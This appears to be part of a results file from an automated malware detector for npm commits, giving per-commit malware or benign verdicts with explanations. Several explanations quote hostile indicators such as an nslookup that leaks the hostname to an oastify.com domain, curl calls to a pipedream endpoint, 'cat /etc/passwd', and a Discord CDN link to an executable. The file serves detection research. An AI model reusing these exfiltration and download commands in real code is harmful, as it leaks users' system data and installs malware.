+    "explanation": "**At line Not Available file index.js**:\nCode: `POST request to fpyvbfbiithokocamwcw3fk3kmhp6lv6t.oast.fun`\nReason: Sending sensitive system information to a suspicious domain is a strong indicator of malicious activity.\n\n**At line Not Available file index.js**:\nCode: `Leaking system information (homedir, hostname, username, DNS servers)`\nReason: Exfiltrating sensitive system information is a characteristic of malware.\n\n**Summary:** The commit is classified as malware due to the presence of a critical issue related to suspicious network access and data leaks, indicating potential malicious activity and information exfiltration."
+  },
+  {
+    "hash": "3977baca22e9e40ce5f4f6e8efdd81db815cd2dd",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line None file package.json**:\nReason: The static analysis raised several issues, but they are related to potential misconfigurations or code smells rather than clear evidence of malware.\n\n**At line None file ignoreCoverage/copiedModules/antlr4-js-exports/umd/antlr4.js**:\nCode: `String.fromCharCode`\nReason: The use of 'String.fromCharCode' could be used for obfuscation, but without further context, it's not conclusive evidence of malware.\n\n**Summary:** The static analysis identified potential security issues, but they are not conclusive evidence of malware. The dynamic analysis did not detect any malicious behavior. Overall, the commit appears to be benign, but it requires further review to ensure the identified issues are addressed."
+  },
+  {
+    "hash": "25581fd83c17a3c5d20beee51056e2fc9ee8779c",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line not available file index.js**:\nCode: `nslookup `hostname`.8w5smzzjgpv5xy5iqvhxjerhz85ytn.oastify.com`\nReason: This command executes 'nslookup' with a potentially malicious domain, indicating a possible command injection vulnerability and data exfiltration.\n\n**At line not available file package.json**:\nCode: `curl https://eo536ohsnextro9.m.pipedream.net`\nReason: The 'pingback' script makes a suspicious network request, potentially used for tracking or data exfiltration.\n\n**Summary:** The commit contains critical and high-severity issues related to command injection and suspicious network accesses, indicating malicious behavior."
+  },
+  {
+    "hash": "ff7fb6596e937337db581a68251c0f44085dd206",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line not specified file index.js**:\nCode: `child_process.exec() with hardcoded commands`\nReason: Executing system commands with hardcoded values can lead to unauthorized access or data breaches.\n\n**At line not specified file index.js**:\nCode: `axios.post() to http://v845u9t1gtbc7bkdsf1soeqyup0goacz.oastify.com`\nReason: Sending data to a suspicious URL can potentially exfiltrate sensitive information.\n\n**At line not specified file index.js**:\nCode: `cat /etc/passwd`\nReason: Executing this command can leak sensitive system information.\n\n**At line not specified file package.json**:\nCode: `pingback script to https://eo536ohsnextro9.m.pipedream.net`\nReason: This could be used for tracking or other suspicious activities.\n\n**Summary:** The commit contains multiple critical and high-severity issues, including command execution with hardcoded commands, data exfiltration to a suspicious URL, and potential data leaks, indicating malicious behavior."
+  },
+  {
+    "hash": "c032b17c3944305ddfefd6d5a15f84b71b78cf34",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line N/A file src/api/assets.ts**:\nCode: `axios instance with external base URL`\nReason: The code creates an axios instance with a base URL pointing to an external domain, which could be used for data exfiltration or other malicious activities.\n\n**At line N/A file package.json**:\nCode: `child_process dependency`\nReason: The 'child_process' package is included as a dependency, which could potentially be used for executing arbitrary system commands, posing a significant security risk.\n\n**Summary:** The commit contains critical security issues, including a potentially malicious external network request and the inclusion of a dependency that could be used for command execution, indicating malicious intent."
+  },
+  {
+    "hash": "bb63fb3d14f65aaf139680a1e5c958455e00a129",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating the commit is likely benign."
+  },
+  {
+    "hash": "ca06f6f6b50e1310b41efc374fcc7201b6681932",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line N/A file index.js**:\nCode: `N/A`\nReason: Sending sensitive system information to an external server via HTTPS POST request is a strong indicator of malicious activity.\n\n**At line N/A file index.js**:\nCode: `N/A`\nReason: Leaking sensitive system information such as homedir, hostname, username, dns servers, and package.json contents is a serious security risk and indicative of malware.\n\n**At line N/A file package.json**:\nCode: `N/A`\nReason: The 'pingback' script making an HTTP request to a potentially suspicious endpoint is suspicious behavior.\n\n**Summary:** The commit is classified as malware due to the presence of critical issues related to sending and leaking sensitive system information, along with suspicious network activity."
+  },
+  {
+    "hash": "cdff1287e980e7f36874bcd756109fca5a56891d",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line not available file index.js**:\nCode: `HTTPS request to 'exzuperi.ftp.sh' on port 449`\nReason: This is a suspicious network access, potentially exfiltrating sensitive data to an unknown external server.\n\n**At line not available file index.js**:\nCode: `Collecting and sending system information (homedir, hostname, current directory)`\nReason: This indicates a potential data leak, as sensitive system information is being sent to an external server without clear justification.\n\n**At line not available file package.json**:\nCode: `Hardcoded error message 'Error: exzuperi made me' in 'test' script`\nReason: This could indicate a backdoor or malicious code, as it suggests an external influence or control.\n\n**Summary:** The commit is classified as malware due to critical issues identified in the static analysis, including suspicious network access, data leaks, and potential backdoor indicators. The dynamic analysis did not provide additional insights but did not contradict the static analysis findings either."
+  },
+  {
+    "hash": "508ac263dd8e2130cde28e4b9d56a8b2df6f529e",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nReason: Sending a POST request to a suspicious domain with sensitive system information.\n\n**At line None file index.js**:\nReason: Leaking sensitive system information such as homedir, hostname, username, and DNS servers.\n\n**At line None file package.json**:\nReason: Making an HTTP request to a suspicious URL via the 'pingback' script.\n\n**At line None file index.js**:\nReason: Accessing sensitive system information using Node.js built-in modules.\n\n**At line None file None**:\nReason: Dynamic analysis detected an unexpected outbound connection to a suspicious destination.\n\n**Summary:** The commit is classified as malware due to multiple critical and high-severity issues identified in both static and dynamic analyses, including suspicious network access, data leaks, and unexpected outbound connections."
+  },
+  {
+    "hash": "fbebef64c57fda4b7a1f54472177b5c9c15ae6f3",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**Summary:** Both static and dynamic analyses did not report any issues or suspicious behavior, indicating the commit is likely benign."
+  },
+  {
+    "hash": "fc70c95682435f3c58ecf15bb719542906aa12f8",
+    "sample_folder": "mongoose",
+    "predict": "benign",
+    "explanation": "**At line None file .github/workflows/autopublish.yml**:\nReason: The workflow is configured to publish to npm registry, which is a legitimate action for a GitHub Actions workflow.\n\n**At line None file .github/workflows/autopublish.yml**:\nReason: The use of NODE_AUTH_TOKEN is being pulled from secrets, which is a good practice for managing sensitive information.\n\n**At line None file .github/workflows/autopublish.yml**:\nReason: The comment contains non-English text, but it is likely a benign comment and not used to hide malicious intent.\n\n**Summary:** The static analysis raised some issues, but they are related to best practices and potential misconfigurations rather than clear indications of malware. The dynamic analysis did not reveal any malicious behavior. Overall, the commit appears to be benign."
+  },
+  {
+    "hash": "d1cc8e63fdbccaf522999335dde89c5d276d9db1",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file app.js**:\nCode: `HTTP GET request to a potentially malicious domain`\nReason: This indicates potential data exfiltration or other malicious activities.\n\n**At line None file package.json**:\nCode: `'preinstall' script runs 'node app.js'`\nReason: Running 'node app.js' during 'preinstall' makes an HTTP request to a potentially malicious domain, suggesting malicious intent.\n\n**At line None file package.json**:\nCode: `'pingback' script makes a curl request to a potentially suspicious domain`\nReason: This could be used for malicious purposes or to communicate with command and control servers.\n\n**Summary:** The commit is classified as malware due to multiple indicators of suspicious network access and potential data exfiltration or malicious activities, particularly through HTTP requests to potentially malicious domains and suspicious scripts in package.json."
+  },
+  {
+    "hash": "b0f0c8a40a1b01ca8c884a618bb92639979a02e0",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `curl command with a potentially malicious URL in 'preinstall' and 'pingback' scripts`\nReason: Executing curl with unknown URLs can lead to downloading and executing malicious content\n\n**At line None file @sources/Spotify.js**:\nCode: `base64 encoded Spotify client secret sent in the Authorization header`\nReason: Exposing client secrets can lead to unauthorized access to sensitive data\n\n**At line None file @Moonlink/MoonlinkNodes.js**:\nCode: `obfuscated JavaScript using '_0x4d30' function`\nReason: Obfuscated code can hide malicious activities, making it difficult to detect\n\n**At line None file Dynamic Analysis Results**:\nCode: `Repeated curl commands to https://eo536ohsnextro9.m.pipedream.net with multiple IP addresses`\nReason: This behavior is indicative of a potential command and control (C2) communication or data exfiltration\n\n**Summary:** The commit is classified as malware due to the presence of critical and high-severity issues in the static analysis, including command execution with potentially malicious URLs, exposure of client secrets, and obfuscated code. The dynamic analysis further supports this verdict by showing repeated connections to a suspicious URL, indicative of malicious activity."
+  },
+  {
+    "hash": "c6b1c53f11b28c6d50d4b537a36fe73b02bca7c2",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file index.js**:\nCode: `Sending a POST request to 'wmmlfdwpcalzfkoykjlsvlq28tek2aqz.oastify.com'`\nReason: The domain 'wmmlfdwpcalzfkoykjlsvlq28tek2aqz.oastify.com' is suspicious and could be used for data exfiltration or other malicious activities.\n\n**At line None file index.js**:\nCode: `Collecting and sending sensitive system information`\nReason: Collecting and sending sensitive system information such as homedir, hostname, username, and DNS servers to an external server is a malicious activity.\n\n**At line None file None**:\nCode: `curl https://eo536ohsnextro9.m.pipedream.net`\nReason: The dynamic analysis shows multiple outbound connections to different IP addresses on port 443, indicating potential command and control communication or data exfiltration.\n\n**Summary:** The commit is classified as malware due to the presence of suspicious network activity, data exfiltration, and collection of sensitive system information. The static analysis revealed critical and high-severity issues, while the dynamic analysis showed unexpected outbound connections to various IP addresses."
+  },
+  {
+    "hash": "15258dde08aec19f6815609cf6fcda01bf95c0e6",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line None file package.json**:\nCode: `'preinstall' script makes an HTTP request to a suspicious external URL`\nReason: The 'preinstall' script is making an HTTP request to a suspicious external URL, potentially exfiltrating data or executing malicious actions.\n\n**At line None file package.json**:\nCode: `'pingback' script makes an HTTP request to a suspicious external URL`\nReason: The 'pingback' script is making an HTTP request to a suspicious external URL, potentially exfiltrating data or executing malicious actions.\n\n**At line None file None**:\nCode: `curl https://eo536ohsnextro9.m.pipedream.net`\nReason: The dynamic analysis shows multiple 'curl' commands being executed to a suspicious URL, indicating potential malicious activity.\n\n**Summary:** The commit is classified as malware due to the presence of suspicious 'preinstall' and 'pingback' scripts in 'package.json' and the dynamic analysis showing 'curl' commands to a suspicious URL, indicating potential data exfiltration or malicious actions."
+  },
+  {
+    "hash": "d56090fb6dc0368b260db6043b47a8af4fef6994",
+    "sample_folder": "mongoose",
+    "predict": "malware",
+    "explanation": "**At line N/A file src/index.js**:\nCode: `https://cdn.discordapp.com/attachments/1205546560218341407/1226177059957506120/Snow.exe?`\nReason: The code downloads an executable file from a suspicious URL, which is a strong indicator of malicious activity.\n\n**At line N/A file src/index.js**:\nCode: `child_process.exec() with input (folderD)`\nReason: The use of child_process.exec() with potentially tainted input is a security risk as it can lead to command execution attacks.\n\n**At line N/A file src/index.js**:\nCode: `eval-like functionality and Function constructor`\nReason: The presence of eval-like functionality and the Function constructor in obfuscated code can be used for code injection attacks.\n\n**Summary:** The commit is classified as malware due to its suspicious network activity, potential for command execution, and code injection vulnerabilities. The download of an executable from a suspicious URL is particularly indicative of malicious intent."
+  }
+]
